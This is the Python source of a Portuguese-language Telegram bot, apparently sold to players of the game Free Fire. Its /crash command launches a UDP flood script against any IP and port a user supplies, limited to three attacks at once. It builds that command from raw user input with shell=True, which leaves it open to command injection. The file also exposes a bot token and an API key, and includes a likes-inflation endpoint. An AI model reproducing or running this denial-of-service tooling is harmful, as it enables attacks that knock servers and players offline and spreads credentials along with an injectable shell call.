import os
import subprocess
import telebot
import requests
from threading import Thread

# Token e ID do dono
API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
OWNER_ID = 6430703027

# Inicialização do bot
bot = telebot.TeleBot(API_TOKEN)

# Listas de usuários
authorized_users = [OWNER_ID]
vip_users = []
vip_commands = []
processes = []  # Lista para armazenar processos ativos
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processes) >= MAX_ATTACKS:
        oldest_process = processes.pop(0)
        if oldest_process.poll() is None:  # Verifica se o processo ainda está ativo
            oldest_process.terminate()

# Comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🤖 Bem-vindo ao bot! 🎉\n\n"
        "📋 *Comandos disponíveis:*\n"
        "/crash <IP:PORT> <porta> <duração> - Envia um ataque ao IP especificado ⚡\n"
        "/meuid - Mostra seu ID de usuário 🆔\n"
        "/comprarbot - Link para comprar o bot 🛒\n"
        "/info <ID> - Informações da conta do jogador de Free Fire 🕹️\n"
        "/checkban <ID> - Verificar se o jogador está banido 🚫\n"
        "/evento - Exibe eventos do Free Fire 🎉\n"
        "/likes - Envia likes para o jogador 👍\n"
        "/listusers - Lista os usuários registrados 🔍\n\n"
        "👑 *Comandos para VIPs e dono:*\n"
        "/adduser <ID> - Adiciona um usuário autorizado ✅\n"
        "/removeuser <ID> - Remove um usuário autorizado ❌\n"
        "/promovervip <ID> - Promove um usuário a VIP 🌟\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário 🔻\n\n"
        "🔒 *Comandos exclusivos do dono:*\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs ⚠️\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP 🔓"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and not (message.from_user.id in vip_users or message.from_user.id == OWNER_ID):
        bot.send_message(message.chat.id, "⚠️ Apenas VIPs podem usar este comando.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.send_message(message.chat.id, "❌ Uso correto: /crash <IP:PORT> <porta> <duração>")
            return

        ip_port, porta, duration = command_parts[1], command_parts[2], command_parts[3]
        manage_attacks()

        command = f"python start.py UDP {ip_port} {porta} {duration}"
        process = subprocess.Popen(command, shell=True)
        processes.append(process)

        bot.send_message(message.chat.id, f"⚡ Ataque enviado para {ip_port}:{porta} por {duration} segundos!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"🆔 Seu ID de usuário é: {message.from_user.id}")

# Comando /comprarbot
@bot.message_handler(commands=['comprarbot'])
def buy_bot(message):
    bot.send_message(
        message.chat.id,
        "🛒 *Adquira o bot agora!*\n\n"
        "📩 Entre em contato comigo pelo Telegram para comprar:\n"
        "👉 [Clique aqui para comprar](https://t.me/werbert_ofc)",
        parse_mode="Markdown"
    )

# Comando /info
@bot.message_handler(commands=['info'])
def get_info(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.send_message(message.chat.id, "❌ Uso correto: /info <ID>")
        return

    player_id = command_parts[1]
    api_url = f"https://api.nowgarena.com/api/v1/player?uid={player_id}"
    try:
        response = requests.get(api_url)
        data = response.json()

        if data["success"]:
            player_info = data["data"]["PlayerBasicInfo"]
            bot.send_message(
                message.chat.id,
                f"🔍 Informações do jogador (ID: {player_id}):\n\n"
                f"👤 Nome: {player_info['AccountNickname']}\n"
                f"🌍 Região: {player_info['AccountRegion']}\n"
                f"🔲 Nível: {player_info['AccountLevel']}\n"
                f"💬 Likes: {player_info['PlayerLikes']}\n"
                f"🏆 Rank BR: {player_info['BRRank']['Rank']}\n"
                f"🎮 Elite Pass: {player_info['PlayerElitePass']['Status']} (Nível {player_info['PlayerElitePass']['Level']})"
            )
        else:
            bot.send_message(message.chat.id, "❌ Não foi possível obter as informações do jogador.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /checkban
@bot.message_handler(commands=['checkban'])
def check_ban(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.send_message(message.chat.id, "❌ Uso correto: /checkban <ID>")
        return

    player_id = command_parts[1]
    api_url = f"https://api.nowgarena.com/api/check_banned?uid={player_id}"
    try:
        response = requests.get(api_url)
        data = response.json()

        if data["status"] == "success":
            if data["isBanned"] == "yes":
                bot.send_message(message.chat.id, f"🚫 O jogador `{player_id}` está banido por {data['period']} dias.", parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, f"✅ O jogador `{player_id}` não está banido.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "❌ Não foi possível verificar o status do jogador.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /evento
@bot.message_handler(commands=['evento'])
def eventos_free_fire(message):
    api_url = "https://api.nowgarena.com//api/events?region=br&key=projetoswq"
    try:
        response = requests.get(api_url)
        data = response.json()

        if not data.get("error"):
            events = data["events"]
            for event in events:
                bot.send_message(
                    message.chat.id,
                    f"🎉 *Evento*: {event['title']}\n"
                    f"📅 Início: {event['start']}\n"
                    f"⏳ Fim: {event['end']}\n"
                    f"📸 [Imagem]({event['image']})",
                    parse_mode="Markdown"
                )
        else:
            bot.send_message(message.chat.id, "❌ Não há eventos disponíveis.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /likes
@bot.message_handler(commands=['likes'])
def send_likes(message):
    api_url = "https://api.nowgarena.com/api/send_likes?uid=359648670&key=projetoswq"
    try:
        response = requests.get(api_url)
        data = response.json()

        if data["success"]:
            likes_info = data["Likes_Info"]
            bot.send_message(
                message.chat.id,
                f"👍 *Likes enviados com sucesso!*\n\n"
                f"👤 Jogador: {likes_info['Name']}\n"
                f"🔲 Likes antes: {likes_info['Likes before']}\n"
                f"🔼 Likes depois: {likes_info['Likes later']}"
            )
        else:
            bot.send_message(message.chat.id, "❌ Não foi possível enviar os likes.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Inicia o bot
if __name__ == "__main__":
    bot.polling(none_stop=True)